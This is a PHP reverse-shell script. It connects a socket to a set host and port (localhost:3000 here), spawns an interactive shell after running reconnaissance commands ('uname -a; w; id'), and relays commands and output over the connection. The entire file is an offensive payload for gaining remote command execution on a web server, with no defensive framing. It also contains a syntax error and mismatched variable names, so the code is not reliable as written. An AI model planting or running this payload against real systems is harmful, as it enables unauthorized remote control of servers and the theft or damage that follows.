<?php

$IP = 'localhost';
$PORT = 3000;
$sh = 'uname -a; w; id; bin/sh -i';
$w = null;
$e = null;

chdir("/");
umask(0);

$sock = fsockopen($IP, $PORT, $ERRNO, $ERRSTR, 30);
if(!$sock) {
  print "$errstr\n$errno\nexiting...";
  exit(1);
}

$x = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));

$proc = proc_open($sh, $x, $pipes);

if(!is_resource($proc)) {
  print "cant spawn shell\nexiting...";
  exit(1)
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

print "opened reverse shell connection";

while (true) {
  if(feof($sock)) {
    print "connection terminated";
    break;
  }
  if (feof($pipes[1])) {
    print "proc. terminated";
    break;
  }
  $y = array($sock, $pipes[1], $pipes[2]);
  $socket_change = stream_select($y, $w, $e, null);
  if (in_array($sock, $y)) {
		$input = fread($sock, 1400);
		fwrite($pipes[0], $input);
	}
  if (in_array($pipes[1], $y)) {
		$input = fread($pipes[1], 1400);
		fwrite($sock, $input);
	}
  if (in_array($pipes[2], $y)) {
		$input = fread($pipes[2], 1400);
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($proc);

?>
